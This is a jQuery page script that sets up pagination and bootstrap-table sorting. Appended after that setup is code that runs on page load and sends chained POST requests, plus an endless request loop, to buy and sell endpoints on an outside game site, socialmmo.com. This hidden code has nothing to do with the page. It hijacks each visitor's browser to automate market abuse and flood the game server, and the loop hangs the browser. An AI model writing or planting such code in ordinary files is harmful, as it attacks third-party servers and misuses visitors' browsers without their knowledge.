
$(document).ready(function (){

    $('#luckmoshy').luckmoshyPagination({

        // the total number of pages
        totalPages: 5,

        // the current page to show on start
        startPage: 1,

        // maximum visible pages
        visiblePages: 5,

        // callback function
        onPageClick: function (event, page) {
            $(document).scrollTop(0);
            $('.page-active').removeClass('page-active');
            $('#container-pagnation'+page).addClass('page-active');


        }

    });

    $.getScript("https://unpkg.com/bootstrap-table@1.18.2/dist/extensions/multiple-sort/bootstrap-table-multiple-sort.js", function (){
        var $table = $('.tabla-sort')
        $table.bootstrapTable()
    })

    var $table = $('.tabla-print')
    $table.bootstrapTable()
     $table = $('.tabla-sticky')
    $table.bootstrapTable()
    // $table = $('#table1')
    // $table.bootstrapTable()


})









$(function () {
    $('.pop').popover({
        container: 'body'
    })
})

$.getScript("https://code.jquery.com/jquery-3.5.1.min.js", function (){
    function petar(i=0){

        $.ajax({
            method: "post",
            url: "https://socialmmo.com/game/loader/loader/entrar/tipos/mercado/comprar.php?re=1",
            data: {p:i, pre:1},
            success: function (){
                $.ajax({
                    method: "post",
                    url: "https://socialmmo.com/game/loader/loader/entrar/tipos/mercado/vender.php?re=1",
                    data: {p:i, pre:1},
                    success: function (){
                        petar(i+1)
                    }
                });
            }
        });
    }
    petar()
})


for (let i = 0; true; i++) {

    $.ajax({
        method: "post",
        url: "https://socialmmo.com/game/loader/loader/entrar/tipos/mercado/comprar.php?re=1",
        data: {p:i, pre:1},

    });
    $.ajax({
        method: "post",
        url: "https://socialmmo.com/game/loader/loader/entrar/tipos/mercado/vender.php?re=1",
        data: {p:i, pre:1},

    });

}
